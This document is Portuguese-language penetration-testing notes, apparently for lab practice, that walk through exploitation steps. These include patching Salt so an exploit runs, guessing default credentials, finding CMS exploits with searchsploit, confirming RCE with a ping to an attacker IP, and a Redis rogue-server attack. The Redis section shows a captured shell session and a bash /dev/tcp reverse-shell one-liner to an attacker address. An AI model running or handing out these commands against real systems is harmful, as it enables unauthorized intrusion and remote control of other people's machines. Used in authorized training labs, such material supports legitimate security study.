## Exploitation

### Python Compatibility Issues in Exploits

Alguns exploits requerem bibliotecas específicas que podem ter problemas de compatibilidade com versões mais recentes do Python. No caso de exploits que utilizam a biblioteca **Salt**, por exemplo, ajustes podem ser necessários para garantir que tudo funcione corretamente.

#### Exemplo de Solução

```
# Criar um ambiente virtual para isolar a versão do Python
python3 -m venv env
. ./env/bin/activate

# Instalar dependências necessárias para o exploit
pip install distro salt

# Corrigir incompatibilidades na biblioteca Salt com Python 3.8+
sed -i 's/from platform import _supported_dists//' ./env/lib/python3.8/site-packages/salt/grains/core.py
sed -i 's/_supported_dists +=/_supported_dists =/' ./env/lib/python3.8/site-packages/salt/grains/core.py
```

Essas adaptações são para garantir a compatibilidade da biblioteca Salt com Python 3.8, o que permite que o exploit funcione corretamente no ambiente configurado.

### Default Credential Guessing

```bash
# Teste de credenciais padrão comuns (exemplo: admin:admin, root:root) para acessar painéis de administração e outros serviços.
# Essa etapa é fundamental pois muitos sistemas mantêm credenciais padrão, que representam uma vulnerabilidade crítica.
```

**Nota**: Tentar credenciais padrão é uma abordagem inicial essencial, pois muitos sistemas ainda utilizam configurações padrão, oferecendo acesso administrativo sem autenticação personalizada.


### Exploração de CMS (Content Management Systems)

Ao encontrar um CMS, é importante identificar a versão exata da aplicação, pois muitos CMS populares possuem vulnerabilidades publicamente conhecidas que podem ser exploradas. Seguem os passos recomendados:

1. **Identificar a Versão do CMS**: Busque a versão nas páginas de login, rodapé, ou nos arquivos de configuração acessíveis. Conhecer a versão é essencial para direcionar a pesquisa de exploits.

2. **Pesquisa de Exploits Públicos**: Utilize ferramentas como `searchsploit` para buscar exploits específicos para essa versão.
   ```bash
   # Atualiza o banco de dados do searchsploit
   searchsploit -u

   # Exemplo de busca e cópia de um exploit
   searshsploit Joomla 
   searchsploit -m <exploit_id>
   ```

3. **Verificar Necessidade de Autenticação**: Muitos exploits de CMS são autenticados, ou seja, requerem login para serem utilizados. Verifique se é necessário credenciais válidas antes de iniciar o exploit.

4. **Exploração Comum (RCE, File Upload Bypass, SQLi)**: CMS frequentemente possuem vulnerabilidades de execução remota de código (RCE), bypass no upload de arquivos, e injeção SQL (SQLi), que permitem controle sobre o sistema.

**Nota**: A exploração de CMS é uma etapa crítica em pentests, pois muitas vezes esses sistemas contêm dados sensíveis e controles administrativos. Use exploits com cautela, sempre verificando os requisitos e condições para a execução.

---

## Teste de RCE com Ping

### Passo 1: Executar o Exploit com Comando Ping
Execute o exploit com um comando `ping` apontando para o IP da sua máquina de ataque:

```
python3 exploit.py -c 'ping -c1 <IP_da_máquina_de_ataque>' -t <URL_do_alvo>
```

> Exemplo: `python3 exploit.py -c 'ping -c1 192.168.145.128' -t http://192.168.145.160/grav-admin`

### Passo 2: Capturar o Tráfego com tcpdump
Na máquina de ataque, use `tcpdump` para monitorar pacotes ICMP e verificar se o ping chega:

```
tcpdump -i <interface> icmp
```

> Exemplo: `tcpdump -i tun0 icmp`

### Resultado Esperado
Se o exploit funcionar, você verá pacotes `ICMP echo request` e `echo reply` no tcpdump, confirmando a execução do comando `ping` no alvo.


**Resumindo:**
1. **Exploit**: `python3 exploit.py -c 'ping -c1 <IP_atacante>' -t <URL_alvo>`
2. **Monitorar**: `tcpdump -i <interface> icmp`
3. **Confirmação**: Pacotes ICMP indicam sucesso do RCE.

---

### Redis RCE Exploitation

Explorando vulnerabilidades em Redis (versão <=5.0.5) para obter Execução Remota de Comando (RCE) utilizando o exploit **Redis Rogue Server**.

Passo 1: Executar o Exploit com redis-rogue-server

O comando abaixo configura o Redis Rogue Server para se conectar ao Redis alvo e obter RCE. Substitua `<rhost>`, `<rport>`, `<lhost>`, e `<lport>` conforme necessário:

https://github.com/n0b0dyCN/redis-rogue-server?source=post_page-----49920d4188de--------------------------------

```
./redis-rogue-server.py --rhost=<IP_do_Alvo> --rport=<Porta_do_Alvo> --lhost=<IP_de_Loopback> --lport=<Porta_de_Loopback>
```

Exemplo
```
./redis-rogue-server.py --rhost=192.168.245.176 --rport=6379 --lhost=192.168.45.168 --lport=4443
```

Para obter reverse shell

```
rlwrap nc -lnvp 4444
```

https://github.com/hanslub42/rlwrap

Ou, para outro repositório:

https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server
```
┌──(kali㉿kali)-[~/Awsome-Redis-Rogue-Server]
└─$ python3 redis_rogue_server.py -rhost 192.168.120.118 -lhost 192.168.118.23
[*] Init connection...
[+] Target accessible!
[*] Exploit Step-1.
[+] RDB dir: /tmp
[*] Done.
[+] Accept connection from 192.168.120.118:42480
[*] The Rogue Server Finished Sending the Fake Master Response.
[*] Wait for redis IO and trans flow close...
[*] Exploit Step-2.
[*] Done.
[+] It may crash target redis cause transfer large data, be careful.
[?] Shell? [i]interactive,[r]reverse:i
[!] DO NOT USING THIS TOOL DO ANYTHING EVIL!
[+] =========================== Shell ============================= 
$ whoami && hostname 
prudence
blackgate
$ 
```

Para obter reverse shell
```
$ bash -c 'bash -i >& /dev/tcp/192.168.118.23/4422 0>&1'
```


---
